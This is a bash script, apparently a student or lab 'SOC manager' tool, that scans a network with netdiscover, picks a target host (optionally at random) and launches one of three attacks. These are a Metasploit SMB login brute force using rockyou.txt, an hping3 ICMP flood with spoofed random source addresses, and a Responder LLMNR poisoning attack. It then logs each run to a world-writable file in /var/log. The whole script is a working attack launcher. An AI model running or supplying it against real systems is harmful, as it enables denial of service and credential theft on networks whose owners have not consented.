#!/bin/bash

useColor="true"

# Font Color
CYAN='\033[0;36m'
RED='\033[0;31m'
ORANGE='\033[1;33m'
NOCOLOR='\033[0m'

echo -e "\033[31m           0000\033[0m_____________0000________0000000000000000__000000000000000000+\n\033[31m         00000000\033[0m_________00000000______000000000000000__0000000000000000000+\n\033[31m        000\033[0m____000_______000____000_____000_______0000__00______0+\n\033[31m       000\033[0m______000_____000______000_____________0000___00______0+\n\033[31m      0000\033[0m______0000___0000______0000___________0000_____0_____0+\n\033[31m      0000\033[0m______0000___0000______0000__________0000___________0+\n\033[31m      0000\033[0m______0000___0000______0000_________000___0000000000+\n\033[31m      0000\033[0m______0000___0000______0000________0000+\n\033[31m       000\033[0m______000_____000______000________0000+\n\033[31m        000\033[0m____000_______000____000_______00000+\n\033[31m         00000000\033[0m_________00000000_______0000000+\n\033[31m           0000\033[0m_____________0000________000000007;"

echo -e "${ORANGE}SOC MANAGER "Help Team Stay Alert" TOOL${NOCOLOR}"

function install_package {
  package_name="$1"
  echo "Checking if $package_name is installed"
  if ! command -v $package_name &> /dev/null; then
    echo "$package_name is not installed. Installing now..."
    sudo apt-get update
    sudo apt-get install -y $package_name
    echo "$package_name installed successfully."
  else
    echo "$package_name is already installed."
  fi
}

# Check if Hping3 is installed
echo "Checking if HPing3 is installed"
if ! command -v hping3 &> /dev/null; then
     install_package "hping3"
else
    echo "Hping3 is already installed."
fi

# Check if Metasploit is installed
echo "Checking if Metasploit is installed "
if ! command -v msfconsole &> /dev/null; then
    echo "metasploit is not installed. Installing now..."
    install_package "metasploit-framework"
    echo "metasploit installed successfully."
else
    echo "Metasploit is already installed."
fi

# Check if Responder is installed
echo "Checking if responder is installed"
if ! command -v responder &> /dev/null; then
    echo "responder is not installed. Installing now..."
    install_package "responder"
    echo "responder installed successfully."
else
    echo "Responder is already installed."
fi

#Reading IP Address Range from User

echo -e "${CYAN}Please enter an ip range you would like to scan${NOCOLOR}" 

read ipaddr

# Scan the local network and store a list of unique IP addresses in an array
readarray -t ip_list < <(sudo netdiscover -r $ipaddr -P | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | awk '{print $1}' | sort | uniq )

# Echo the list of IP addresses discovered and prompt the user to select an IP address or choose a random one by keying 'x'
echo -e "${CYAN}List of available IP addresses:${NOCOLOR}"

while true; do
  for i in "${!ip_list[@]}"; do
    echo "$i: ${ip_list[$i]}"
  done
  echo -e "${CYAN}\nEnter the number of the host you want to target, or 'x' for a random choice:${NOCOLOR} "
  read host_number

  # Check if the user chose a random IP address or an available IP address
  if [ "$host_number" = "x" ]; then
  
  # Generate a random number between 0 and the length of the IP address array
  
  random_index=$((RANDOM % ${#ip_list[@]}))
  host_ip=${ip_list[$random_index]}
  echo -e "${WHITE}\nSelected random IP address: ${GREEN}$host_ip" 
  break
else
  # Retrieve the selected IP address from the array
  
  if (( $host_number >= 0 && $host_number < ${#ip_list[@]} )); then
    host_ip=${ip_list[$host_number]}
    echo -e "${WHITE}\nSelected IP address: ${CYAN}$host_ip${NOCOLOR}" 
    break
  else
    echo -e "${RED}\nInvalid choice. ${WHITE}Please enter a number between 0 and $((${#ip_list[@]}-1)) or 'x' for a random choice."
    exit 1
  fi
fi

# If any other keys are entered, exit the script
echo -e "${RED}\nInvalid input. ${WHITE}Exiting the script.${NOCOLOR}"
exit 1

done

#Function for Random Attack

function select_random_attack {
  attacks=("Metasploit" "Hping3" "Responder LLMNR Attack")
  random_attack=${attacks[$RANDOM % ${#attacks[@]}]}
  echo "Selected random attack: $random_attack"
}

#Function for Metaspoilt Brute force Attack with wordlist

function execute_metasploit {
	attack_type='Metaspoilt Brute Force Attack with wordlist'
	if [ -f /usr/share/wordlists/rockyou.txt ]; then
    echo "rockyou.txt found in /usr/share/wordlists/"
    echo "Using rockyou.txt as wordlist for both User and Password Brute force "
else
    echo "rockyou.txt not found in /usr/share/wordlists/"
    echo "Proceeding to gunzip rockyou.txt.gz"
    sudo gunzip /usr/share/wordlists/rockyou.txt.gz
fi
  echo "Selected attack: Metasploit"
  sleep 3
  echo 'Executing Brute Force Attack with wordlist'
  echo 'use auxiliary/scanner/smb/smb_login' > enum.rc
  echo "set rhosts $host_ip" >> enum.rc
  echo 'set user_file /usr/share/wordlists/rockyou.txt' >> enum.rc
  echo 'set pass_file /usr/share/wordlists/rockyou.txt' >> enum.rc
  echo 'run' >> enum.rc
  echo 'exit' >> enum.rc
  
  msfconsole -r enum.rc -o testresult.txt
}

#Function for HPing3 Denial of Service Ping Flood Attack

function execute_hping3 {
  attack_type='Hping3 DOS Ping Flood with Random Source IP'
  echo "Selected attack: Hping3"
  echo "Denial of Service Ping Flood Attack with Random Source IP executing in 5 seconds. CTL + C to STOP" 
  sleep 5
      
  sudo hping3 -1 --flood $host_ip --rand-source
}

#Function for Man-in-the-Middle Responder LLNMR Attack

function execute_responder {
  attack_type='Man-in-the-Middle Responder LLMNR Attack'
  echo 'Selected attack: Responder LLMNR Attack'
  echo 'Man-in-the-Middle Responder LLMNR Attack '
  sudo responder -I eth0 $host_ip 
}

# Prompt user to select an Attack
echo -e "${CYAN}Choose an attack method:${NOCOLOR}"
echo "1) Metasploit Brute Force Attack"
echo "2) Hping3 Denial of Service Attack"
echo "3) Responder Man-in-the-Middle LLMNR Attack"
echo "z) Random Attack"

read -p 'Enter your choice:' choice
      
# Check user input and execute particular function

case "$choice" in
  1)
    execute_metasploit
    ;;
  2)
    execute_hping3
    ;;
    
  3)
    execute_responder
    ;;  
  z)
    select_random_attack
    case "$random_attack" in
      "Metasploit")
        execute_metasploit
        ;;
      "Hping3")
        execute_hping3
        ;;
      "Responder LLMNR Attack")
        execute_responder
        ;;
      
    esac
    ;;
  *)
    echo 'Invalid choice. Please enter a number between 1 and 3 or 'z' for a random choice.'
    exit 1
    ;;
esac

#On attack selection, save it into a log file in /var/log with the kind of attack, time of execution, and IP addresses
      sudo touch /var/log/attack.log
      sudo chmod 777 /var/log/attack.log
      log_file="/var/log/attack.log"
	  attack_time=$(date +"%Y-%m-%d %H:%M:%S")
      sudo echo "Attack type: $attack_type" >> "$log_file"
      sudo echo "Execution time: $attack_time" >> "$log_file"
      sudo echo "IP address: $host_ip" >> "$log_file"
      sudo echo "=================================" >> "$log_file"

exit


